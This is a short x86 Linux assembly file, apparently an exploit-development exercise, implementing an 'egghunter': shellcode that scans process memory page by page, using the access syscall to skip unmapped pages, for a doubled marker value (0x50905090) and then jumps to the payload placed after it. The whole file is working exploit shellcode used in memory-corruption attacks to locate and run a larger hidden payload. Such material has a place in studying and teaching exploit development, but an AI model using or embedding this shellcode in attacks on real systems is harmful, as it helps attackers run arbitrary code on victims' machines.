; file: egg_hunt.nasm
; Author: mariuszha
 
 
 
global _start
 
section .text
 
_start:
	; registers initialization
	mov ebx, 0x50905090
	xor ecx, ecx
	mul ecx

page_alignment:
	or dx, 0xfff

next_addr:
	inc edx
	
	pushad
	lea ebx, [edx+0x4]
	mov al, 0x21
	int 0x80

	cmp al, 0xf2
	popad
	jz page_alignment

	cmp [edx], ebx
	jnz next_addr
	cmp [edx+4], ebx
	jnz next_addr
	
	jmp edx